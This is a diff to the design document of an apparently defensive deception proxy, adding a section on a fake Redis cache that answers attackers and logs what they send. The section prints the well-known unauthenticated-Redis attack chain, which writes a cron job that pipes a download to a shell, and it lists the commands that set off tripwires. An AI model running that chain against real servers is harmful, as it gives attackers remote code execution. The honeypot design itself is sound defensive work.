@@ -38,6 +38,7 @@ exist.
 - [A substation that is not there](#a-substation-that-is-not-there)
 - [A controller that is not there](#a-controller-that-is-not-there)
 - [An agent that is not there](#an-agent-that-is-not-there)
+- [A cache that is not there](#a-cache-that-is-not-there)
 - [Refusal at the TLS handshake](#refusal-at-the-tls-handshake)
 - [What it produces](#what-it-produces)
 - [Building it out](#building-it-out)
@@ -83,6 +84,8 @@ Two consequences worth stating plainly:
 | WAF shape rules | `examples/waf/attack-surface-rules.conf` | The shapes it reaches for first | An application that genuinely sends one | Real; detect first |
 | Slow lane | `degradation` | Time, and connection reuse | A slow site for a misjudged client | Real; gentle by design |
 | Deceptive answer | `routes[].deceive` | Certainty — it cannot tell a find from a miss | **A real client silently loses data** | Must be none |
+| Fabricated device | `modbus.deception`, `iec104.deception`, `s7.deception`, `snmp.deception` | A plant it must map, all of it wrong; the tripwire that fires while it does | A frame on its way to a real device answered by the fabrication -- which is what the one rule exists to prevent | None: it answers only where a refusal would be |
+| Fabricated cache | `redis.deception` | The whole exploit chain, answered -- and its directory, file name and payload in your log | The same, plus a value read back that was never stored | None, as above |
 | Handshake refusal | `handshake` | A key exchange it does not get to spend | A client refused with no log line to explain it | Only what the ban list holds |
 
 ## How the signals chain
@@ -676,6 +679,88 @@ relay cannot compute, and an unauthenticated answer to an authenticated
 protocol is a worse tell than silence), and it does not answer a notification.
 A `SetRequest` is answered as though it landed, and nothing is written — the
 same choice the Modbus section makes about a refused write.
+
+## A cache that is not there
+
+The four above run plant and network equipment, where the visitor is usually a
+person with a laptop or a scanner mapping an estate. This one is different: the
+attacker on Redis is a **script**, and it is always the same script.
+
+An exposed instance with no password is found by a scanner, and what arrives next
+is a fixed sequence. It has been the same sequence for a decade:
+
+```
+INFO                              what is this, and what version
+CONFIG GET dir                    where does it write
+CONFIG GET dbfilename             what does it write
+CONFIG SET dir /var/spool/cron    point that somewhere that executes
+CONFIG SET dbfilename root
+SET x "\n* * * * * curl … | sh\n"  the payload, as an ordinary value
+SAVE                              write the file
+```
+
+That is remote code execution built entirely out of commands the protocol
+considers ordinary. There is no exploit in it and nothing to patch: `CONFIG SET`
+plus `SAVE` is a documented way to write a file wherever the server can write, and
+`dir` plus `dbfilename` is the path.
+
+A refusal stops the script at the first step. It also tells its author that
+something is in the way, and the next address on their list is thirty seconds
+away. What it does not tell you is which directory they were aiming at, or what
+they meant to run.
+
+`redis.deception` answers instead:
+
+```yaml
+# A honeypot: a cache on the application network with nothing behind it.
+- name: cache-spare
+  address: "10.60.0.41:6379"
+  kind: redis
+  redis:
+    require_tls: false     # an unprotected instance is what the scanning wants
+    deception:
+      mode: decoy
+      profile: session-store
+      version: "7.0.15"    # …what the estate's own caches say…
+      key_count: 256
+```
+
+**The rule is the same one**: a command that was going to reach the server is
+never answered by the fabrication. On a real listener (`mode: answer`) it sits
+exactly where a refusal would be written, so the exploit chain gets its `+OK` and
+the application's own traffic still goes to the real Redis.
+
+**The tripwires need no configuring**, which is the one place this protocol
+differs from the four above. On a PLC an operator has to say which registers
+nobody legitimate reads, because only they know. Here the answer is universal:
+nothing legitimate sends `CONFIG SET`, `MODULE LOAD`, `REPLICAOF`, `EVAL`,
+`SHUTDOWN`, `FLUSHALL` or `SAVE` to a fabricated cache. All of them raise
+`redis_tripwire` from the start, and `tripwire` adds to that list rather than
+replacing it.
+
+**What makes a fabricated cache answerable** is mostly that its keyspace holds
+together. `DBSIZE`, `KEYS`, `SCAN` and `INFO`'s keyspace section count the same
+keys; `SCAN` walks all of them and terminates; `TYPE` and the command that follows
+it agree; a key read twice inside one period reads the same both times; and
+`total_commands_processed` and `uptime_in_seconds` only ever rise, because a
+counter that went backwards between two `INFO`s is the tell that ends the
+pretence. An unknown command answers Redis's own wording, echo of arguments
+included, because a scanner that sends a nonsense command and reads something
+else has found the decoy.
+
+**Two things it will not pretend.** `EVAL` and `MODULE LOAD` answer the error the
+real server answers when it cannot: a `+OK` to either would be a claim that code
+was running, and nothing said afterwards would be consistent with it. This is the
+same line the Modbus section draws about a refused write — the fabrication answers
+as though the command landed, and it does not invent a consequence it cannot
+maintain.
+
+**And a password is never recorded.** `AUTH`'s arguments become the user name and
+the password's *length* in the event, for the reason the SNMP section gives about
+community strings: a log holding every credential sprayed at the estate is a list
+of the estate's own credentials as often as not. Everything else *is* recorded,
+one line and clipped, because on this protocol the arguments are the message —
+the directory, the file name, the replication target, the cron entry.
 
 ## Refusal at the TLS handshake
 
